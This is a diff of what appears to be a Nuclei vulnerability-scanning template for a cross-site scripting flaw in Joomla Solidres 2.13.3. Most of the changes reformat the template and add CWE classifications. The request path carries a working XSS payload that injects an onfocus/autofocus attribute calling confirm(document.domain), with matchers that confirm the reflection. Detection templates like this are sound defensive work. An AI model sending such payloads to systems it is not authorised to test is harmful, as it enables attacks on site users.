@@ -1,5 +1,4 @@
 id: joomla-solidres-xss
-
 info:
   name: Joomla Solidres 2.13.3 - Cross-Site Scripting
   author: r3Y3r53
@@ -10,31 +9,30 @@ info:
     - https://www.exploit-db.com/exploits/51638
     - https://cxsecurity.com/issue/WLB-2023070080
     - https://cyberlegion.io/joomla-solidres-2-13-3-cross-site-scripting/
+  classification:
+    cwe-id:
+      - CWE-79
+      - CWE-83
   metadata:
-    verified: true
     max-request: 1
-  tags: xss,joomla,unauth,vuln
-
+    verified: true
+  tags: joomla,unauth,vuln,xss
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/joomla/greenery_hub/index.php/en/hotels/reservations?location=d2tff&task=hub.search&ordering=score&direction=desc&type_id=0&show=db8ck%22onfocus=%22confirm(document.domain)%22autofocus=%22xwu0k"
-
-    matchers-condition: and
-    matchers:
-      - type: word
+  - matchers:
+      - condition: and
         part: body
+        type: word
         words:
-          - 'onfocus="confirm(document.domain)"autofocus'
-          - 'com_solidres'
-        condition: and
-
-      - type: word
-        part: header
+          - onfocus="confirm(document.domain)"autofocus
+          - com_solidres
+      - part: header
+        type: word
         words:
-          - 'text/html'
-
-      - type: status
-        status:
+          - text/html
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/joomla/greenery_hub/index.php/en/hotels/reservations?location=d2tff&task=hub.search&ordering=score&direction=desc&type_id=0&show=db8ck%22onfocus=%22confirm(document.domain)%22autofocus=%22xwu0k'
